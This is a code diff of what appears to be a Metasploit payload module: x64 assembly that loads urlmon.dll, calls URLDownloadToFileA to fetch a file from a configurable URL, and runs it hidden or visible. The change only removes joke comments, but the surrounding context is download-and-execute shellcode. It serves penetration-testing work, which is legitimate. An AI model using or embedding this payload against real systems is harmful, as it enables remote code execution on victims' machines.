@@ -49,7 +49,6 @@ module MetasploitModule
             pop rbp
             call LoadLibrary
             db "urlmon.dllK"
-            ; V, is this the land of do-as-you-please?
 
         LoadLibrary:
             pop rcx ; rcx points to the dll name.
@@ -61,14 +60,12 @@ module MetasploitModule
         SetUrl:
             call SetFile
             db "#{url}A"
-            ; The Sound of Silence maybe a Careless Whisper?
 
         SetFile:
             pop rdx ; 2nd argument
             xor byte [rdx+#{url.length}], 'A' ; null terminator
             call UrlDownloadToFile
             db "#{file}C"
-            ; Never compromise not even in the face of armageddon.
 
         UrlDownloadToFile:
             pop r8 ; 3rd argument
@@ -79,7 +76,6 @@ module MetasploitModule
             push rcx    ; 5th argument
             mov r10d, #{Rex::Text.block_api_hash('urlmon.dll', 'URLDownloadToFileA')}
             call rbp
-            ; I can see the sun, but even if I cannot see the sun, I know that it exists. And to know that the sun is there - that is living.
 
         SetCommand:
             call Exec
@@ -95,7 +91,6 @@ module MetasploitModule
     if display == 'HIDE'
       hide = %(
             call rbp
-            ; I am vengeance! I am the night! I am Batman!
             )
       payload << hide
 
@@ -103,7 +98,6 @@ module MetasploitModule
       show = %(
             inc rdx ; SW_NORMAL = 1
             call rbp
-            ; It's our only home. Our heaven and our hell. This is Outer Heaven.
             )
       payload << show
     end
@@ -121,7 +115,6 @@ module MetasploitModule
             xor rcx,rcx
             mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'ExitThread')}
             call rbp
-            ; She walks in beauty, like the night...
             )
       payload << exit_asm
     end
